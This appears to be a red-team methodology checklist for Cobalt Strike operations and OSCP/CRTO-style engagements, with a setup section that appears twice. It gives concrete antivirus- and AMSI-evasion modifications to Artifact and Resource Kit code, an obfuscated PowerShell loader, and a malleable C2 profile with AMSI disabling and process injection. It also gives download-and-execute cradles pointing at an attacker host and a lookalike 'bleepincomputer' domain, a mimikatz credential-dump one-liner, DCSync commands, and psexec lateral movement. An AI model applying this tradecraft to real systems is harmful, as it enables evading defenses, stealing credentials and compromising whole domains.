# Cobalt Strike Setup
NOTE: Only pay attention to this section if operating from a C2 (such as cobalt strike)

1.- Modify Artifact Kit
```c
/* Open C:\Tools\cobaltstrike\arsenal-kit\kits\artifact in VSCode */
/* Navigate to src-common and open patch.c. */

/* Line 45, replace for loop with while loop */
x = length;
while(x--) {
  *((char *)buffer + x) = *((char *)buffer + x) ^ key[x % 8];
}

/* Line ~116, replace for loop with while loop */
int x = length;
while(x--) {
  *((char *)ptr + x) = *((char *)buffer + x) ^ key[x % 8];
}
```

```powershell
# Modify script_template.cna and replace all instances of rundll32.exe with msedge.exe
$template_path="C:\Tools\cobaltstrike\arsenal-kit\kits\artifact\script_template.cna" ; (Get-Content -Path $template_path) -replace 'rundll32.exe' , 'msedge.exe' | Set-Content -Path $template_path

# Compile the Artifact kit (From WSL in Attacker windows Machine)
$ cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact
$ ./build.sh mailslot VirtualAlloc 351363 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts 

# Check Artifact kit payload against ThreatCheck
PS > C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Tools\cobaltstrike\custom-artifacts\mailslot\artifact64big.exe
	# Make note of hexcode identified, reverse via Ghidra, modify, save.

# Recompile
# Retest
# Repeat until...
[+] No threat found!

# Load into Cobalt Strike
C:\Tools\cobaltstrike\custom-artifacts\mailslot\artifact.cna
```

2.- Compile Resource Kit
```powershell
# Build (WSL)
$ cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource && ./build.sh /mnt/c/Tools/cobaltstrike/custom-resources

# Open C:\Tools\cobaltstrike\custom-resources in VSCode
# Select template.x64.ps1

# Line 5, replace 
.Equals('System.dll') -> .Equals('Sys'+'tem.dll')

# Line 32, replace entire line
$var_wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll WriteProcessMemory), (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool])))
$ok = $var_wpm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [IntPtr]::Zero)

# Save
# Test
PS > C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Tools\cobaltstrike\custom-resources\template.x64.ps1 -e amsi
	# Make note of code identified, open with VSCode

# Remodify
# Retest
# Repeat until...
[+] No threat found!

# Select compress.ps1
# Use Invoke-Obfuscation to create unique obfuscation, or...
SET-itEm  VarIABLe:WyizE ([tyPe]('conVE'+'Rt') ) ;  seT-variAbLe  0eXs  (  [tYpe]('iO.'+'COmp'+'Re'+'S'+'SiON.C'+'oM'+'P'+'ResSIonM'+'oDE')) ; ${s}=nEW-o`Bj`eCt IO.`MemO`Ry`St`REAM(, (VAriABle wYIze -val  )::"FR`omB`AsE64s`TriNG"("%%DATA%%"));i`EX (ne`w-`o`BJECT i`o.sTr`EAmRe`ADEr(NEw-`O`BJe`CT IO.CO`mPrESSi`oN.`gzI`pS`Tream(${s}, ( vAriable  0ExS).vALUE::"Dec`om`Press")))."RE`AdT`OEnd"();

# Save

# Testing (ThreatCheck no worky on this one...)
Host on Cobalt Strike a new PAYLOAD (not compress.ps1) # Do after payload creation
IEX ((new-object net.webclient).downloadstring('http://10.0.0.5/test'))
	# See if PS errors out or not...

# Remodify
# Retest
# Repeat until no error.

# Load into Cobalt Strike
C:\Tools\cobaltstrike\custom-resources\resources.cna
```

3.- Malleable C2 Setup
```powershell
# SSH into team server
ssh attacker@10.0.0.5

# Move to profiles directory
cd /opt/cobaltstrike/profiles

# Modify C2 profile
vim default.profile

# Modify the file (APPEND, not replace dingo)

stage {
   set userwx "false";
   set module_x64 "Hydrogen.dll";  # use a different module if you like
   set copy_pe_header "false";
}

post-ex {
  set amsi_disable "true";
  set spawnto_x64 "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
  set obfuscate "true";
  set cleanup "true";
  set pipename "dotnet-diagnostic-#####, ########-####-####-####-############";

  transform-x64 {
      strrep "ReflectiveLoader" "NetlogonMain";
      strrepex "ExecuteAssembly" "Invoke_3 on EntryPoint failed." "Assembly threw an exception";
      strrepex "PowerPick" "PowerShellRunner" "PowerShellEngine";

      # add any other transforms that you want
  }
}

process-inject {
  execute {
      NtQueueApcThread-s;
      NtQueueApcThread;
      SetThreadContext;
      RtlCreateUserThread;
      CreateThread;
  }
}

# Save, then restart teamserver
sudo /usr/bin/docker restart cobaltstrike-cs-1
```

4.- Add scshell64
```powershell
Cobalt Strike > Script Manager > C:\Tools\SCShell\CS-BOF\scshell.cna

consider altering this too...
```

5.- Create Listeners
```
in general, i would say: 
dns -> long-haul persistence 
http/s -> post-ex 
smb -> lateral movement 
tcp-local -> priv esc
```

```powershell
Cobalt Strike > Listeners > Add

# DNS
Name: dns
Payload: Beacon DNS
DNS Hosts: cdn.bleepincomputer.com
Host Rotation Strat : round-robin
Max Retry : None
DNS Host (stager) cdn.bleepincomputer.com
Profile : Default

# HTTP
Name: http
Payload: Beacon HTTP
HTTP Hosts: www.bleepincomputer.com
HTTP Host (Stager) : www.bleepincomputer.com

# SMB
Name: smb
Payload: Beacon SMB
Pipename: TSVCPIPE-e43f18e1-5260-45d8-a674-9377b802c69d # ls \\.\pipe\
	# For realworld, consider msedge.pipe.7732 or something similar...

# TCP
Name: tcp
Payload: Beacon TCP
Port: 80
Bind to localhost: False

# TCP (local)
Name: tcp-local
Payload: Beacon TCP
Port: 1337
Bind to localhost: True
```

6.- Testing
```powershell
# Generate Payloads
Payloads > Windows Stageless Generate All Payloads # Folder: C:\Payloads

# Host 64-bit powershell payload
C:\Payloads\http_x64.ps1
URI: /test
Host: www.bleepincomputer.com

->
http://www.bleepincomputer.com:80/test

# Enable Defender RTP (ON OUR BOX OR TEST BOX)
Set-MPPreference -DisableRealTimeMonitoring $false

# Invoke powershell payload
iex (new-object net.webclient).downloadstring("http://www.bleepincomputer.com/test")
	# did it work? if so, we are good

# Testing Lateral Movement (this was in lab but not sure how we can actually test this before doing it...)
beacon> make_token CONTOSO\rsteel Passw0rd! # Impersonate local admin
‌‌beacon> remote-exec winrm lon-ws-1 (Get-MpPreference).DisableRealtimeMonitoring # verify defender status
beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe # change spawn process
beacon> jump psexec64 lon-ws-1 smb # jump!
```



# Parking Lot
```
# Annotate sensitive files here that we do not have access to, in case we GAIN access later
```

```
Park creds/key/domain info here:
```
# Reconnaissance
#### TCP
Initial Scan
`sudo nmap <ip> -sC -sT -sV -p<ports> -oN ~/path/<standalone>/<standalone>_TCP_ALL`


Deep Scan
`sudo nmap <ip> -A -p<ports> -oN ~/path/<standalone>/<standalone>_TCP_ALL`

#### UDP
Initial Scan
`sudo nmap <ip> -sU --top-ports=100 -oN ~/path/<standalone>/<standalone>_UDP`


Deep Scan
`sudo nmap <ip> -sU -A -p<ports> -oN ~/path/<standalone>/<standalone>_UDP_ALL`

#### Autorecon
`sudo env "PATH=$PATH" autorecon <ip_address>

#### Nikto
`nikto -host <ip_address>   # or /etc/hosts hostname`



# Footprinting
```
1. Unknown Port? Search for it DIRECTLY on HackTricks
2. google '<service> exploits' AND '<service> RCE'
3. Any ports that do not reveal much, redo scan with -A and specify port
4. Redo scan if host added to /etc/hosts
5. Public exploit not working? Verify, then search for others on github
```

place ports and findings here...
#### 80 http
```
# Notes
```

nmap findings
	

nikto
	-

Visit website
	

Wappalyzer
	versions (including name of site)
		-
	searchsploit
		-
	`google "<version> exploits", "<version> rce", etc
		-

Manual Enumeration
	poke around
	-

Page Source
	Inspect page source
		-
	html2markdown -- `curl -s <target> | html2markdown`
		-

login portal
	default creds
		admin:admin
		Admin:Admin
		source config documentation
			-
	sqli `# try ' and also auth bypass`
		-
	forgot password abuse
		-
	check KALI local repo
		-
	hydra brute force ([[Web App Bruteforcing]])
		rockyou.txt
			-
		`cewl` wordlist
			-
		other
			-
	user/cred reuse
		-


**Some Common pages to try**
/robots.txt
	-

/.htaccess `# ALSO via file upload`
	-

/.env
	-

/.git
	-

/api/
	also try /api
	-


[[SQLi]] -- [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md) `# For reference`
	Manual Findings
		-
	SQLMap `# always try if stuck...`
		-


**File Inclusion**
[[Methodology/Web App/File Inclusion/Local File Inclusion (LFI)|Local File Inclusion (LFI)]] Identification  -- `# /index.php?view=<file_name>`
	yes or no?

LFI Enumeration -- Manual + Fuzzing
	-

**File Inclusion RCEs**
[[Methodology/Web App/File Inclusion/RCE/Remote File Inclusion (RFI)|Remote File Inclusion (RFI)]]
	-
[[LFI Log Poisoning]]
	-
[[PHP Wrappers]] -- Also config file disclosure
	-
[[LFI and File Uploads]]
	-



file upload -- see [[File Upload Attacks]]
	-

Command injection
	-

HTTP Verb Tampering
	-

IDOR
	-

XXE Injection `# not in scope for OSCP`
	-

Read php files -- see [[PHP Wrappers]] `# php://filter...`
	`index.php?page=php://filter/resource=<file>
		-
	`index.php?file=php://filter/convert.base64-encode/resource=<file>
		-

Hacktricks
	-

Automated scanning
	wpscan
	git-dumper
	etc...

Weird/out of place pictures
	-

Duplicate webpages `# ie: /old, compare page sources`
	-

Exposed Config files
	-

Found hashes? `# crackstation, john, hashcat...`
	-

Enumerate webpages
[[Feroxbuster]] + Extension scan `# sh files? shellshock`
	-

[[Feroxbuster]] Re-scan MANUALLY identified directories
	-

[[Domain Fuzzing]] `# 2 wordlists -- Don't forget to add subdomains to /etc/hosts -- ffuf AND wfuzz
	-

[[Parameter Fuzzing]]
	-

Check github documentation for interesting files
	if you get directory redirects from directories found from ferox, try accessing files within anyway by referencing the github documentation of the webapp

Guess directories (last resort)
	Try names we have enumerated
	ie: if hostname = `<name>`, then try `http://<ip>/<name>`



#### Active Directory
See [[AD Attacks]]
Blind User Enumeration `# Kerbrute, RID cycling, etc...`
	-

Check for users with Do not require kerberos pre-authentication ([[AS-REP Roasting]] -no-pass)
	-

Collect Sharphound data for bloodhound
	-

Enumerate Bloodhound `# Parse CAREFULLY`
	-

[[AS-REP Roasting]] Attack
	-

Kerberoast Attack
	-

Targeted Kerberoast Attack
	-

Timeroast
	-

ADCS 
	-

ACLs
	-

Silver Ticket
	-

PtH
	-

PtT
	-

PtC
	-

Domain Dominance [[14 Domain Dominance]]
	DCSync
		-
	Ticket Forgery
		-
	DPAPI Backup Keys
		-

Domain Trusts [[15 Forest & Domain Trusts]]
	Enumerate Trusts
		-
	Trust Abuse
		-
# Initial Access
```
Need to compile something? Ideally we are able to compile on target...
	yes: great
	no: search for precompiled online OR compile locally 

Public exploit not working? Verify, then search for others on github
```

Query Defender Status
	-

Query Applocker 
	-
	Is Applocker present?
		-
	Enumerate
		-

# Persistence
```
Establish and document elevated persistence method here.

In general, I would say: 

dns -> long-haul persistence 
http/s -> post-ex 
smb -> lateral movement 
tcp-local -> priv esc
```

Establish Persistence 
	-

Pass session for faster channel/post-ex commands (C2)
	-

SSH Keygen
	-

# Host-Recon & Post-Exploitation
#### C2 Specific:
Session Passing `slow -> faster channel `
	-

Keylogger
	-

Check processes
	-

Clipboard
	-

Screenshots
	-

VNC (Remote desktop control)
	-

Import tooling `powershell import`
	-
#### Windows:
hostname
	-

whoami
	-

whoami /priv
	-

whoami /groups
	-

set
	-

`dir \Users
	-

local users `# net user`
	-
	specific users `# net user <user>`    `# do for EVERY user, check comments, etc...`
		-

domain users `# net user /domain
	-
	specific users
		-

net localgroup
	-

net group
	-

systeminfo
	-

network information
	`ipconfig /all
		-
	`route print
		-
	`netstat -ano     # internally exposed ports? chisel! webapps? conf files, LFI + rev shell, etc..` 
		-

installed apps
	32 bit `--- # Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`
		-
	64 bit `--- # Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`
		-
	`reg query` any interesting software
		-

Running Apps `# Get-Process`
	-

User History `Get-History`
	-
	PSReadline `# (Get-PSReadlineOption).HistorySavePath`
		-
	All Users (see [[Windows History]])
		-

switch user `# also consider runas /user:<domain>\<user> cmd.exe`
	`user:user` cred combinations
		-
	credential reuse
		-
	ssh reuse
		-

Path Interception
	PATH Env variable abuse
		-
	Search Order Hijacking 
		-
	Unquoted Service Paths `# Remove 'auto' filters if we can start/stop services`
		CMD `# wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """`
			-
		PowerShell `# Get-CimInstance -ClassName Win32_Service | Where-Object { $_.PathName -notlike '"*' and $_.StartMode -eq 'Auto' -and $_.PathName -like '* *' -and $_.PathName -notlike 'C:\Windows\*'} | Select-Object Name, PathName`
			-
		Manually Check (Look at Installed Apps and probe)
			-

Weak Service Permissions 
	Enumerate services `# Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}`
		or... `sc_enum`
		-
	Check file service perms `# icacls`
		-
	Check service registry perms (FullControl) `# Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\Services\BadWindowsService` 
		-

DLL Hijacking `#procmon - Check for missing DLLs OR place evil dll higher in hierarchy`
	-

Software Vulnerabilities
	Unsafe Deserialization
		-

User Account Control (UAC)
	CMSTPLUA UAC Bypass
		-

ChangeConfig Service Right Abuse (See [[Services]])
	`Import-Module .\Get-ServiceAcl.ps1`
	`"<Service>" | Get-ServiceAcl | select -ExpandProperty Access`
		-

Scheduled Tasks  `# schtasks  |  schtasks /query /fo LIST /v  |  Get-ScheduledTask
	-
	Hunt for specific users -- `Get-ScheduledTask | Where-Object -Property Author -match <user> | fl *`
		-
	`Get-ScheduledTask | Select-Object Author,Trigger,Action,TaskName,TaskPath,Source,Principal | fl`
		-
	TaskScheduler -- `#GUI - look at author, trigger, action, etc...`
		-

Medium Integrity credential access
	Cred from web browsers `.\SharpChrome.exe logins`
		-
	Windows Cred Manager
		Enumerate for creds `.\Seatbelt.exe WindowsVault`
			-
		Decrypt creds `.\SharpDPAPI.exe credentials /rpc`
			-

Manual Enumeration: `# dir /a /q`
	`\directory\we\spawn\in    # and adjacents`
		-
	`\Users\<user>\AppData\stuff
		-
	`\Users\<user>\<all_files>
		-
	`\Users\<users>
		-
	`\
		-
	`\xampp`
		-

Search for specific files `# Use Get-ChildItem premade queries from master checklist` See [[Looting]]
	Config Files
		-
	kdbx files
		-
	.txt, .ini files
		-
	home dir recursive search for creds/databases
		-
	zip files
		-
	SAM/SYSTEM/SECURITY
		-

Automations
.\winPEASany.exe `# also winPEAS.ps1... PARSE CAREFULLY... AlwaysInstallElevated...
	-

.\LaZagne.exe all
	-

.\jaws-enum.ps1
	-

Import-Module .\PowerUp.ps1
	`Invoke-AllChecks`
		-
	`Get-ModifiableServiceFile
		-
	`Get-UnquotedService`
		-

windows exploit suggester
	-
#### Linux:
hostname
	-

whoami
	-

id
	-

sudo -V
	-

sudo -l
	-

env
	-

history
	-

/etc/passwd
	users
		-
	file perms
		-

/etc/shadow
	-

/etc/sudoers
	-

switch user `# su -l <user>`
	`user:user` cred combinations
		-
	credential reuse
		-
	ssh reuse
		-

os/kernel version info `# is gcc present?` [[OSCP Prep/Methodology Notes/PrivEsc/Kernel Exploits|Kernel Exploits]]
	-
	`searchsploit #.#.#-###`
		-
	google
		-

system processes `# ps aux`
	-

interfaces `# ip a`
	-

routes `# routel`
	-

ports `# internally exposed ports? chisel! webapps? conf files, LFI + rev shell, etc..
	-

multiple webservers `# check /var/www and check /etc/apache2/sites-enabled or /etc/nginx/sites-enabled`
	NOTE: vhost could share same port but only be accessible from localhost `# ie: port-forward`
	-

scheduled tasks `# pspy64 automated, crontab -l, cat /var/log/syslog | grep -i cron`
	-

installed packages `# dpkg -l`
	-

world writable directories `# find / -writable -type d 2>/dev/null`
	-

mounted drives `# cat /etc/fstab, lsblk`
	-

list loaded drivers `# lsmod`
	-

SUID files `# find / -perm -u=s -type f 2>/dev/null`
	-

Password Reuse `# identified passes/strings go here`
	-
	redo `sudo -l` if password was required
		-
	local db auth
		-
	switch users `# su -l <user>   AND   ssh <user>@<ip>`
		-
	misc
		-

Manual Enum:  `# consider ls -laiRtu

`/directory/we/spawn/in`    `# and adjacent ones`
	-
`/home/<user>
	-
`/home
	-
`/`
	-
`/opt`
	-
`/var`      `# www/, mail/, etc... cred hunting galore`
	-
anything else of interest
	-


Config files and information within:
	-

.db search `# find / -name *.db 2>/dev/null      ## also *db*, *database*, etc...`
	-

.sql search `# find / -name *.sql 2>/dev/null      ## also *sql*, etc...
	-

.conf search `# find / -name *.conf 2>/dev/null      ## also *conf*, *cfg*, etc...`
	-

Fire `./linpeas.sh > /tmp/linpeas.txt`
	manually parse
		-
	`grep -i pass
		-
#### Automated:
```
peas

LaZagne.exe all

SharpUp.exe audit

```



# Privilege Escalation
```
Document PrivEsc Attempts in this section
```
#### Attempt 1:
# Elevated Persistence
```
Establish and document elevated persistence method here.
OPSEC? - WMI Event Subscription
```

# Credential Access

```
OPSEC? DON'T DUMP LSASS BRO... otherwise mimikatz ;)
```

Medium Integrity cred access
	Cred from web browsers
		-
	Windows Cred Manager
		-

High Integrity cred access
	Kerberos `# Triage targets first for OPSEC`
		Targeted asreproast
			-
		Targeted kerberoast
			-
		Dump tickets from memory (does not touch LSASS :))
			-
		Renew TGTs if needed
			-

OS Credential Dumping 
```powershell
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "sekurlsa::credman" "sekurlsa::ekeys" "lsadump::sam" "lsadump::lsa" "lsadump::cache" "lsadump::secrets" "exit"
```

LaZagne.exe
```powershell
.\LaZagne.exe all
```

# User Impersonation
```powershell
# NOTE: use token-store whenever we impersonate
token-store steal [PID]
token-store use [ID]
```

High-Integrity
	Token Impersonation 
		-
	Process Injection
		-

PtH
	-

PtT
	-

PtC
	-

# Discovery
#### BloodHound
SharpHound `BAD OPSEC`
	-

BOFHound Collection
	-

Restricted Groups
	-

WMI Filters
	-
#### LDAP Queries
###### Domain Information
```
```
###### Kerberos
Unconstrained Delegation
	Identification
		-
	Standard
		-
	S4U2Self Computer Takeover
		-

Constrained Delegation
	Identification
		-
	Standard
		-
	Service Name Substitution
		-

Resource Based Constrained Delegation
	-

Silver Ticket (to impersonate rather than persistence) `# NOT GOOD OPSEC...`
	-
###### MSSQL
MSSQL Server Identification
	if present, proceed to [MSSQL](#MSSQL)

# Lateral Movement

WinRM
	-

SCShell (PSExec is BAD)
	-

MavInject
	-

#### C2
Reference [[10 Lateral Movement]]
#### Without C2
winrm, psexec, etc...

# Pivoting

Enumerate interfaces for Internal networks
	-

SOCKS
	-

Reverse Port Forward
	-

Ligolo-ng
	-
# MSSQL

Present?
	-

Code Exec
	SQL CLR (best opsec)
		-
	OLE Automation
		-
	xp_cmdshell
		-

Linked Servers?
	-

Priv Esc
	-

# Domain Dominance

DCSync
```powershell
# impersonate a domain admin
beacon> make_token [DOMAIN]\[user] [password]

# dc sync -- capture domain krbtgt hash
beacon> dcsync [domain.com] [DOMAIN]\krbtgt

# dc sync -- capture computer account
beacon> dcsync [domain.com] [DOMAIN]\[hostname]$
```

Ticket Forgery for Persistence
	Silver Ticket
		-
	Golden Ticket
		-
	Diamond Ticket `BEST OPSEC`
		-

DPAPI Backup Keys
	-

# Forest and Domain Trusts

Enumerate Trust Accounts
```powershell
ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName
	# TrustDirection = 1 -> proceed to One-Way Inbound Trusts
	# TrustDirection = 2 -> proceed to One-Way Outbound Trusts
	# TrustDirection = 3 -> proceed to Parent-Child Tickets
```

Parent Child Tickets
	-

One-Way Inbound Trusts
	-

One-Way Outbound Trusts
	-

# Lessons Learned
```
Annotate any lessons learned from this engagement here
```
# Duplicate Checklist
In case I need an empty one :)

## Cobalt Strike Setup

1.- Modify Artifact Kit
```c
/* Open C:\Tools\cobaltstrike\arsenal-kit\kits\artifact in VSCode */
/* Navigate to src-common and open patch.c. */

/* Line 45, replace for loop with while loop */
x = length;
while(x--) {
  *((char *)buffer + x) = *((char *)buffer + x) ^ key[x % 8];
}

/* Line ~116, replace for loop with while loop */
int x = length;
while(x--) {
  *((char *)ptr + x) = *((char *)buffer + x) ^ key[x % 8];
}
```

```powershell
# Modify script_template.cna and replace all instances of rundll32.exe with msedge.exe
$template_path="C:\Tools\cobaltstrike\arsenal-kit\kits\artifact\script_template.cna" ; (Get-Content -Path $template_path) -replace 'rundll32.exe' , 'msedge.exe' | Set-Content -Path $template_path

# Compile the Artifact kit (From WSL in Attacker windows Machine)
$ cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact
$ ./build.sh mailslot VirtualAlloc 351363 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts 

# Check Artifact kit payload against ThreatCheck
PS > C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Tools\cobaltstrike\custom-artifacts\mailslot\artifact64big.exe
	# Make note of hexcode identified, reverse via Ghidra, modify, save.

# Recompile
# Retest
# Repeat until...
[+] No threat found!

# Load into Cobalt Strike
C:\Tools\cobaltstrike\custom-artifacts\mailslot\artifact.cna
```

2.- Compile Resource Kit
```powershell
# Build (WSL)
$ cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource && ./build.sh /mnt/c/Tools/cobaltstrike/custom-resources

# Open C:\Tools\cobaltstrike\custom-resources in VSCode
# Select template.x64.ps1

# Line 5, replace 
.Equals('System.dll') -> .Equals('Sys'+'tem.dll')

# Line 32, replace entire line
$var_wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll WriteProcessMemory), (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool])))
$ok = $var_wpm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [IntPtr]::Zero)

# Save
# Test
PS > C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Tools\cobaltstrike\custom-resources\template.x64.ps1 -e amsi
	# Make note of code identified, open with VSCode

# Remodify
# Retest
# Repeat until...
[+] No threat found!

# Select compress.ps1
# Use Invoke-Obfuscation to create unique obfuscation, or...
SET-itEm  VarIABLe:WyizE ([tyPe]('conVE'+'Rt') ) ;  seT-variAbLe  0eXs  (  [tYpe]('iO.'+'COmp'+'Re'+'S'+'SiON.C'+'oM'+'P'+'ResSIonM'+'oDE')) ; ${s}=nEW-o`Bj`eCt IO.`MemO`Ry`St`REAM(, (VAriABle wYIze -val  )::"FR`omB`AsE64s`TriNG"("%%DATA%%"));i`EX (ne`w-`o`BJECT i`o.sTr`EAmRe`ADEr(NEw-`O`BJe`CT IO.CO`mPrESSi`oN.`gzI`pS`Tream(${s}, ( vAriable  0ExS).vALUE::"Dec`om`Press")))."RE`AdT`OEnd"();

# Save

# Testing (ThreatCheck no worky on this one...)
Host on Cobalt Strike a new PAYLOAD (not compress.ps1) # Do after payload creation
IEX ((new-object net.webclient).downloadstring('http://10.0.0.5/test'))
	# See if PS errors out or not...

# Remodify
# Retest
# Repeat until no error.

# Load into Cobalt Strike
C:\Tools\cobaltstrike\resources\resources.cna
```

3.- Malleable C2 Setup
```powershell
# SSH into team server
ssh attacker@10.0.0.5

# Move to profiles directory
cd /opt/cobaltstrike/profiles

# Modify C2 profile
vim default.profile

# Modify the file (APPEND, not replace dingo)

stage {
   set userwx "false";
   set module_x64 "Hydrogen.dll";  # use a different module if you like
   set copy_pe_header "false";
}

post-ex {
  set amsi_disable "true";
  set spawnto_x64 "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
  set obfuscate "true";
  set cleanup "true";

  transform-x64 {
      strrep "ReflectiveLoader" "NetlogonMain";
      strrepex "ExecuteAssembly" "Invoke_3 on EntryPoint failed." "Assembly threw an exception";
      strrepex "PowerPick" "PowerShellRunner" "PowerShellEngine";

      # add any other transforms that you want
  }
}

process-inject {
  execute {
      NtQueueApcThread-s;
      NtQueueApcThread;
      SetThreadContext;
      RtlCreateUserThread;
      CreateThread;
  }
}

# Save, then restart teamserver
sudo /usr/bin/docker restart cobaltstrike-cs-1
```

4.- Create Listeners
```powershell
Cobalt Strike > Listeners > Add

# HTTP
Name: http
Payload: Beacon HTTP
HTTP Hosts: www.bleepincomputer.com
HTTP Host (Stager) : www.bleepincomputer.com

# SMB
Name: smb
Payload: Beacon SMB
Pipename: TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337  # > ls \\.\pipe\
	# For realworld, consider msedge.pipe.7732 or something similar...

# TCP
Name: tcp
Payload: Beacon TCP
Port: 4444
Bind to localhost: False

# TCP (local)
Name: tcp-local
Payload: Beacon TCP
Port: 1337
Bind to localhost: True
```

5.- Testing
```powershell
# Generate Payloads
Payloads > Windows Stageless Generate All Payloads # Folder: C:\Payloads

# Host 64-bit powershell payload
C:\Payloads\http_x64.ps1
URI: /test
Host: www.bleepincomputer.com

# Enable Defender RTP (ON OUR BOX OR TEST BOX)
Set-MPPreference -DisableRealTimeMonitoring $false

# Invoke powershell payload
iex (new-object net.webclient).downloadstring("http://www.bleepincomputer.com/test")
	# did it work? if so, we are good

# Testing Lateral Movement (this was in lab but not sure how we can actually test this before doing it...)
beacon> make_token CONTOSO\rsteel Passw0rd! # Impersonate local admin
‌‌beacon> remote-exec winrm lon-ws-1 (Get-MpPreference).DisableRealtimeMonitoring # verify defender status
beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe # change spawn process
beacon> jump psexec64 lon-ws-1 smb # jump!
```

## Initial Access

Query Defender Status
	- present on all CRTO exam

Query Applocker
	-

## Host-Recon

getuid
	-

Processes `# ps / process_browser... look for user processes`
	-

## Persistence
Establish Persistence
	-

Pass Session for faster channel/post-ex commands
	-

## Post-Exploitation
Host recon stuff (TO BE CONTINUED)
	-

Post exploit stuff
	-

Medium Integrity cred access (try and wait until after priv esc for this step... see below)
	Cred from web browsers
		-
	Windows Cred Manager
		-

## Privilege Escalation

Path Interception
	PATH Env Variable `# env; Check if software paths exist BEFORE defaults`
		-
	Search Order Hijacking `# cacls; Check for write access to service executing directory`
		-
	Unquoted Service Paths `# cacls; check for services with white spaces`
		-

Weak Service Permissions
	Service File Perms `# cacls, alter and replace`
		-
	Service Registry Perms `# Modifying binary path via weak ACL`
		-

DLL Search Order Hijacking
	DLL Search Order Hijacking `# Adding a bad dll to a higher search order`
		-

Software Vulnerabilities
	Unsafe Deserialization
		-

UAC
	-

## Elevated Persistence
Schtask
	-

Windows Service
	-

## Credential Access

```
DON'T DUMP LSASS BRO
```

Medium Integrity cred access
	Cred from web browsers
		-
	Windows Cred Manager
		-

High Integrity cred access
	Kerberos `# Triage targets first`
		Targeted asreproast
			-
		Targeted kerberoast
			-
		Dump tickets from memory (does not touch LSASS :))
			-
		Renew TGTs if needed
			-

## User Impersonation

```
use token_store whenever we impersonate
```

High-Integrity
	Token Impersonation 
		-
	Process Injection
		-

Pth
	-

Ptt
	-

## Discovery

BloodHound
	BOFHound Collection
		-
	Restricted Groups
		-
	WMI Filters
		-

LDAP Queries
	-
	Kerberos stuff (in [Kerberos](#Kerberos))
		-
	MSSQL Server Identification
		if present, proceed to [MSSQL](#MSSQL)

## Lateral Movement

WinRM
	-

SCShell (PSExec is BAD)
	-

MavInject
	-

## Kerberos

Unconstrained Delegation
	Identification
		-
	Standard
		-
	S4U2Self Computer Takeover
		-

Constrained Delegation
	Identification
		-
	Standard
		-
	Service Name Substitution
		-

Resource Based Constrained Delegation
	-

Silver Ticket (to impersonate rather than persistence) `# NOT GOOD OPSEC...`
	-

## Pivoting

Enumerate interfaces for Internal networks
	-

SOCKS
	-

Reverse Port Forward
	-


## MSSQL

Present?
	-

Code Exec
	-

Linked Servers?
	-

Priv Esc
	-

## Domain Dominance

DCSync
	-

Ticket Forgery for Persistence
	Silver Ticket
		-
	Golden Ticket
		-
	Diamond Ticket (BEST OPSEC)
		-

DPAPI Backup Keys
	-

## Forest and Domain Trusts

Inter-Realm Tickets
	-

Parent Child Tickets
	-

One-Way Inbound Trusts
	-

One-Way Outbound Trusts
	-